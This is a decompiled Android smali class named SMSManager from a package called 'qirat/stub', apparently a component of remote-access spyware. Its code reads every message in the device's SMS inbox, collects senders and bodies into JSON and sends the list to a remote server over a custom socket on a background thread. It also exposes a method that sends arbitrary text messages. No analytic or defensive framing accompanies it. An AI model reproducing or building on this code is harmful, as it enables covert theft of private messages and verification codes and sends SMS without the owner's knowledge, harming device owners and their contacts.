.class public Lcom/qirat/stub/SMSManager;
.super Ljava/lang/Object;
.source "SMSManager.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "SMSManager"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getSMSList(Landroid/content/Context;)Lorg/json/JSONObject;
    .locals 12
    .param p0, "context"    # Landroid/content/Context;

    .line 18
    const-string v1, "SMSManager"

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v0

    .line 19
    .local v2, "smsListJSON":Lorg/json/JSONObject;
    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    move-object v3, v0

    .line 20
    .local v3, "list":Lorg/json/JSONArray;
    const/4 v4, 0x0

    .line 22
    .local v4, "cur":Landroid/database/Cursor;
    const/4 v5, 0x0

    :try_start_0
    const-string v0, "content://sms/inbox"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    move-object v7, v0

    .line 23
    .local v7, "uriSMSURI":Landroid/net/Uri;
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    const/4 v10, 0x0

    const/4 v11, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    move-object v4, v0

    .line 25
    if-nez v4, :cond_1

    .line 26
    const-string v0, "Cursor is null."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 27
    nop

    .line 44
    if-eqz v4, :cond_0

    .line 45
    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    .line 27
    :cond_0
    return-object v5

    .line 30
    :cond_1
    :goto_0
    :try_start_1
    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 31
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 32
    .local v0, "sms":Lorg/json/JSONObject;
    const-string v6, "address"

    invoke-interface {v4, v6}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v4, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 33
    .local v6, "address":Ljava/lang/String;
    const-string v8, "body"

    invoke-interface {v4, v8}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v4, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 34
    .local v8, "body":Ljava/lang/String;
    const-string v9, "phoneNo"

    invoke-virtual {v0, v9, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 35
    const-string v9, "msg"

    invoke-virtual {v0, v9, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 36
    invoke-virtual {v3, v0}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 37
    nop

    .end local v0    # "sms":Lorg/json/JSONObject;
    .end local v6    # "address":Ljava/lang/String;
    .end local v8    # "body":Ljava/lang/String;
    goto :goto_0

    .line 38
    :cond_2
    const-string v0, "smsList"

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 39
    const-string v0, "SMS list collection complete."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 40
    nop

    .line 44
    if-eqz v4, :cond_3

    .line 45
    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    .line 40
    :cond_3
    return-object v2

    .line 44
    .end local v7    # "uriSMSURI":Landroid/net/Uri;
    :catchall_0
    move-exception v0

    goto :goto_2

    .line 41
    :catch_0
    move-exception v0

    goto :goto_1

    :catch_1
    move-exception v0

    .line 42
    .local v0, "e":Ljava/lang/Exception;
    :goto_1
    :try_start_2
    const-string v6, "Error getting SMS list"

    invoke-static {v1, v6, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 44
    nop

    .end local v0    # "e":Ljava/lang/Exception;
    if-eqz v4, :cond_4

    .line 45
    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    .line 48
    :cond_4
    return-object v5

    .line 44
    :goto_2
    if-eqz v4, :cond_5

    .line 45
    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    .line 47
    :cond_5
    throw v0
.end method

.method static synthetic lambda$sendSMSListToServer$0(Landroid/content/Context;)V
    .locals 4
    .param p0, "context"    # Landroid/content/Context;

    .line 68
    invoke-static {p0}, Lcom/qirat/stub/SMSManager;->getSMSList(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v0

    .line 69
    .local v0, "smsList":Lorg/json/JSONObject;
    const-string v1, "SMSManager"

    if-nez v0, :cond_0

    .line 70
    const-string v2, "Cannot send SMS list, the collected list is null."

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 71
    return-void

    .line 75
    :cond_0
    invoke-static {p0}, Lcom/qirat/stub/Socket;->getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;

    move-result-object v2

    .line 76
    .local v2, "socket":Lcom/qirat/stub/Socket;
    invoke-virtual {v2}, Lcom/qirat/stub/Socket;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 77
    const-string v3, "Sending SMS list to server..."

    invoke-static {v1, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 78
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "SMS_LIST:"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    goto :goto_0

    .line 80
    :cond_1
    const-string v3, "Cannot send SMS list, socket not connected."

    invoke-static {v1, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 82
    :goto_0
    return-void
.end method

.method public static sendSMS(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 7
    .param p0, "phoneNo"    # Ljava/lang/String;
    .param p1, "msg"    # Ljava/lang/String;

    .line 53
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-object v1, v0

    .line 54
    .local v1, "smsManager":Landroid/telephony/SmsManager;
    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v3, 0x0

    move-object v2, p0

    move-object v4, p1

    .end local p0    # "phoneNo":Ljava/lang/String;
    .end local p1    # "msg":Ljava/lang/String;
    .local v2, "phoneNo":Ljava/lang/String;
    .local v4, "msg":Ljava/lang/String;
    :try_start_1
    invoke-virtual/range {v1 .. v6}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 55
    const/4 p0, 0x1

    return p0

    .line 56
    .end local v1    # "smsManager":Landroid/telephony/SmsManager;
    :catch_0
    move-exception v0

    move-object p0, v0

    goto :goto_0

    .end local v2    # "phoneNo":Ljava/lang/String;
    .end local v4    # "msg":Ljava/lang/String;
    .restart local p0    # "phoneNo":Ljava/lang/String;
    .restart local p1    # "msg":Ljava/lang/String;
    :catch_1
    move-exception v0

    move-object v2, p0

    move-object v4, p1

    move-object p0, v0

    .line 57
    .end local p1    # "msg":Ljava/lang/String;
    .restart local v2    # "phoneNo":Ljava/lang/String;
    .restart local v4    # "msg":Ljava/lang/String;
    .local p0, "ex":Ljava/lang/Exception;
    :goto_0
    const-string p1, "SMSManager"

    const-string v0, "Error sending SMS"

    invoke-static {p1, v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 58
    const/4 p1, 0x0

    return p1
.end method

.method public static sendSMSListToServer(Landroid/content/Context;)V
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .line 67
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/SMSManager$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/qirat/stub/SMSManager$$ExternalSyntheticLambda0;-><init>(Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 82
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 83
    return-void
.end method
